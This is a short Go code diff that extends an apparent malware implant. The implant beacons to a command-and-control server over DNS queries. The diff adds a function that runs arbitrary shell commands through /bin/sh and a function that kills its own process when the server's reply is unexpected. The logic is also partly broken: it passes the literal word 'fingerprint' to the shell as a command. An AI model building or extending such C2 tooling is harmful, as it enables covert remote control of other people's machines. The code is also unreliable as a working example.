@@ -4,8 +4,11 @@ import (
 	"context"
 	"fmt"
 	"net"
+	"os"
+	"os/exec"
 	"strconv"
 	"strings"
+	"syscall"
 )
 
 var (
@@ -47,16 +50,29 @@ func dnsquery(query string) string {
 	return ipdecode(ip)
 }
 
+func execute(cmd string) string {
+	// Execute a shell command
+	out, _ := exec.Command("/bin/sh", "-c", cmd).Output()
+
+	return string(out)
+}
+
+func kill() {
+	// Get the current process id
+	pid := os.Getpid()
+	// Kill the process
+	syscall.Kill(pid, 9)
+}
+
 func ping() {
-	// Perform a dns query
-	query := "ping"
-	// Send the query to the C2 server
-	response := dnsquery(query)
-	// Parse the response
-	if response == "pong" {
-		fmt.Println("pong")
+	// Send the ping to the C2 server
+	response := dnsquery("ping")
+
+	if response == "fingerprint" {
+		// If the response is fingerprint, execute the command
+		execute("fingerprint")
 	} else {
-		fmt.Println(response)
+		kill()
 	}
 }
 
